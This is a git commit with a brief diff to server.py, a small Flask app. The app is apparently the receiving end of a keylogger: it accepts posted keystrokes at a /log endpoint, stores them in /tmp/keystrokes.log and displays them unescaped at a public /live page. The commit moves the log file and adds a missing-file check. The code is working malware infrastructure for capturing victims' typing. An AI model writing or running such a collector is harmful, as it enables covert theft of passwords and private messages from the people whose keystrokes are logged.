e5e47b588149eaefead9b62ea9ac3dd89b8bc852
Divyanshverma1000 <divyanshverma05440@gmail.com>
2025-04-04 23:41:01 +0530

    heer

--- server.py
+++ server.py
@@ -5,7 +5,7 @@ import os
 
 app = Flask(__name__)
 log_lock = Lock()
-KEYLOG_FILE = "keystrokes.log"
+KEYLOG_FILE = "/tmp/keystrokes.log"
 
 @app.route('/log', methods=['POST'])
 def handle_keylog():
@@ -25,8 +25,12 @@ def handle_keylog():
 
 @app.route('/live', methods=['GET'])
 def live_view():
+    if not os.path.exists(KEYLOG_FILE):  # check existence
+        return "<pre>No logs yet.</pre>", 200
+
     with open(KEYLOG_FILE, "r") as f:
-        return f"<pre>{f.read()}</pre>"
+        return f"<pre>{f.read()}</pre>", 200
+
 
 if __name__ == "__main__":
     app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)))
